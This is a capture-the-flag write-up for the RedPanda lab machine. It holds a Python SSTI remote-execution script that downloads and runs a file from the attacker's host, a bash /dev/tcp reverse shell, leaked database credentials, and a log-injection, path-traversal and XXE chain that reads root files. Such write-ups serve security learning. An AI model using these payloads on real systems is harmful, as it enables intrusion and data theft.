# Nmap scan
```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-09-20 15:47 CEST
Nmap scan report for redpanda.htb (10.10.11.170)
Host is up (0.031s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 0.53 seconds
```

http://10.10.11.170:8080/search

Instantly looks like SQLi, but turns out to be SSTI

```Java
*{T(java.lang.System).getenv()}
```

First success story
```
{PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, SHELL=/bin/bash, JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64, TERM=unknown, USER=woodenk, LANG=en_US.UTF-8, SUDO_USER=root, SUDO_COMMAND=/usr/bin/java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar, SUDO_GID=0, MAIL=/var/mail/woodenk, LOGNAME=woodenk, SUDO_UID=0, HOME=/home/woodenk}
```

https://f002.backblazeb2.com/file/sec-news-backup/files/writeup/deadpool.sh/_2017_RCE_Springs_/index.html

Finally we can send the payload like so:

```python
import requests

def encode_ssti(message):
	ret = f'*{{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString({ord(message[0])})'
	for ch in message[1:]:
		ret += f'.concat(T(java.lang.Character).toString({ord(ch)}))' 
	ret += f').getInputStream())}}'
	return ret

def stager(cmd):
	data = {
		'name': encode_ssti(cmd)
	}
	r = requests.post('http://10.10.11.170:8080/search', data=data)
	print(r.text)
	print('---')

stager('rm ./rshell.sh')
stager('wget http://10.10.14.34:8888/rshell.sh')
stager('chmod +x rshell.sh')
stager('./rshell.sh')
```

```bash
#!/bin/bash
bash -c 'exec bash -i &>/dev/tcp/10.10.14.34/4444 <&1'
```

Privesc:

MainController.java
```java
@Controller
public class MainController {
  @GetMapping("/stats")
  	public ModelAndView stats(@RequestParam(name="author",required=false) String author, Model model) throws JDOMException, IOException{
		SAXBuilder saxBuilder = new SAXBuilder();
		if(author == null)
		author = "N/A";
		author = author.strip();
		System.out.println('"' + author + '"');
		if(author.equals("woodenk") || author.equals("damian"))
		{
			String path = "/credits/" + author + "_creds.xml";
			File fd = new File(path);
			Document doc = saxBuilder.build(fd);
			Element rootElement = doc.getRootElement();
			String totalviews = rootElement.getChildText("totalviews");
		       	List<Element> images = rootElement.getChildren("image");
			for(Element image: images)
				System.out.println(image.getChildText("uri"));
			model.addAttribute("noAuthor", false);
			model.addAttribute("author", author);
			model.addAttribute("totalviews", totalviews);
			model.addAttribute("images", images);
			return new ModelAndView("stats.html");
		}
		else
		{
			model.addAttribute("noAuthor", true);
			return new ModelAndView("stats.html");
		}
	}

	@GetMapping(value="/export.xml", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE)
	public @ResponseBody byte[] exportXML(@RequestParam(name="author", defaultValue="err") String author) throws IOException {

		System.out.println("Exporting xml of: " + author);
		if(author.equals("woodenk") || author.equals("damian"))
		{
			InputStream in = new FileInputStream("/credits/" + author + "_creds.xml");
			System.out.println(in);
			return IOUtils.toByteArray(in);
		}
		else
		{
			return IOUtils.toByteArray("Error, incorrect paramenter 'author'\n\r");
		}
	}
  @PostMapping("/search")
	public ModelAndView search(@RequestParam("name") String name, Model model) {
	if(name.isEmpty())
	{
		name = "Greg";
	}
        String query = filter(name);
	ArrayList pandas = searchPanda(query);
        System.out.println("\n\""+query+"\"\n");
        model.addAttribute("query", query);
	model.addAttribute("pandas", pandas);
	model.addAttribute("n", pandas.size());
	return new ModelAndView("search.html");
	}
  public String filter(String arg) {
        String[] no_no_words = {"%", "_","$", "~", };
        for (String word : no_no_words) {
            if(arg.contains(word)){
                return "Error occured: banned characters";
            }
        }
        return arg;
    }
    public ArrayList searchPanda(String query) {

        Connection conn = null;
        PreparedStatement stmt = null;
        ArrayList<ArrayList> pandas = new ArrayList();
        try {
            Class.forName("com.mysql.cj.jdbc.Driver");
            conn = DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
            stmt = conn.prepareStatement("SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?");
            stmt.setString(1, "%" + query + "%");
            ResultSet rs = stmt.executeQuery();
            while(rs.next()){
                ArrayList<String> panda = new ArrayList<String>();
                panda.add(rs.getString("name"));
                panda.add(rs.getString("bio"));
                panda.add(rs.getString("imgloc"));
		panda.add(rs.getString("author"));
                pandas.add(panda);
            }
        }catch(Exception e){ System.out.println(e);}
        return pandas;
    }
}
```

RequestInterceptor.java
```java
public class RequestInterceptor extends HandlerInterceptorAdapter {
    @Override
    public boolean preHandle (HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception {
        System.out.println("interceptor#preHandle called. Thread: " + Thread.currentThread().getName());
        return true;
    }

    @Override
    public void afterCompletion (HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception {
        System.out.println("interceptor#postHandle called. Thread: " + Thread.currentThread().getName());
        String UserAgent = request.getHeader("User-Agent");
        String remoteAddr = request.getRemoteAddr();
        String requestUri = request.getRequestURI();
        Integer responseCode = response.getStatus();
        /*System.out.println("User agent: " + UserAgent);
        System.out.println("IP: " + remoteAddr);
        System.out.println("Uri: " + requestUri);
        System.out.println("Response code: " + responseCode.toString());*/
        System.out.println("LOG: " + responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri);
        FileWriter fw = new FileWriter("/opt/panda_search/redpanda.log", true);
        BufferedWriter bw = new BufferedWriter(fw);
        bw.write(responseCode.toString() + "||" + remoteAddr + "||" + UserAgent + "||" + requestUri + "\n");
        bw.close();
    }
}
```

PandaSearchApplication.java
```java
@SpringBootApplication
public class PandaSearchApplication extends WebMvcConfigurerAdapter{
	@Override
	public void addInterceptors (InterceptorRegistry registry) {
		registry.addInterceptor(new RequestInterceptor());
	}

	public static void main(String[] args) {
		SpringApplication.run(PandaSearchApplication.class, args);
	}

}
```

possibly password:

```java
DriverManager.getConnection("jdbc:mysql://localhost:3306/red_panda", "woodenk", "RedPandazRule");
```

user: `woodenk`
pass: `RedPandazRule`

second java application

LogParser.java 
```java
public class App {

    public static Map parseLog(String line) {
        String[] strings = line.split("\\|\\|");
        Map map = new HashMap<>();
        map.put("status_code", Integer.parseInt(strings[0]));
        map.put("ip", strings[1]);
        map.put("user_agent", strings[2]);
        map.put("uri", strings[3]);
        

        return map;
    }
    
    public static boolean isImage(String filename){
        if(filename.contains(".jpg"))
        {
            return true;
        }
        return false;
    }
    
    public static String getArtist(String uri) throws IOException, JpegProcessingException
    {
        String fullpath = "/opt/panda_search/src/main/resources/static" + uri;
        File jpgFile = new File(fullpath);
        Metadata metadata = JpegMetadataReader.readMetadata(jpgFile);
        for(Directory dir : metadata.getDirectories())
        {
            for(Tag tag : dir.getTags())
            {
                if(tag.getTagName() == "Artist")
                {
                    return tag.getDescription();
                }
            }
        }

        return "N/A";
    }
    
    public static void addViewTo(String path, String uri) throws JDOMException, IOException
    {
        SAXBuilder saxBuilder = new SAXBuilder();
        XMLOutputter xmlOutput = new XMLOutputter();
        xmlOutput.setFormat(Format.getPrettyFormat());

        File fd = new File(path);
        
        Document doc = saxBuilder.build(fd);
        
        Element rootElement = doc.getRootElement();
 
        for(Element el: rootElement.getChildren())
        {
    
            
            if(el.getName() == "image")
            {
                if(el.getChild("uri").getText().equals(uri))
                {
                    Integer totalviews = Integer.parseInt(rootElement.getChild("totalviews").getText()) + 1;
                    System.out.println("Total views:" + Integer.toString(totalviews));
                    rootElement.getChild("totalviews").setText(Integer.toString(totalviews));
                    Integer views = Integer.parseInt(el.getChild("views").getText());
                    el.getChild("views").setText(Integer.toString(views + 1));
                }
            }
        }
        BufferedWriter writer = new BufferedWriter(new FileWriter(fd));
        xmlOutput.output(doc, writer);
    }

    public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException {
        File log_fd = new File("/opt/panda_search/redpanda.log");
        Scanner log_reader = new Scanner(log_fd);
        while(log_reader.hasNextLine())
        {
            String line = log_reader.nextLine();
            if(!isImage(line))
            {
                continue;
            }
            // parses statuscode, src, UA, request_uri
            Map parsed_data = parseLog(line);
            System.out.println(parsed_data.get("uri"));
            // get artist from URI
            // /../../../../../../../../tmp/fake.jpg
            String artist = getArtist(parsed_data.get("uri").toString());
            System.out.println("Artist: " + artist);
            // artist is what's embedded into the image
            String xmlPath = "/credits/" + artist + "_creds.xml";
            addViewTo(xmlPath, parsed_data.get("uri").toString());
        }

    }
}

```

Typical log line:
```
statuscode || src_ip || ua || request_uri
200||10.10.14.39||sqlmap/1.4.4#stable (http://sqlmap.org)||/search
```

From the jank terminal we can do
```bash
curl http://10.10.11.170:8080/stats -A "||/../../../../../../../../tmp/annoyedeline.jpg"
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///root/root.txt" >]>
<credits>
  <author>win</author>
  <image>
    <uri>/../../../../../../../../tmp/annoyedeline.jpg</uri>
    <views>1</views>
    <foo>&xxe;</foo>
  </image>
  <image>
    <uri>/img/shy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/crafty.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/peter.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

And place the image with the Artist tag ../tmp/win into /tmp/annoyedeline.jpg

`exiftool -artist=../tmp/win`

After a while XXE attack vector works, and we get `root.txt`
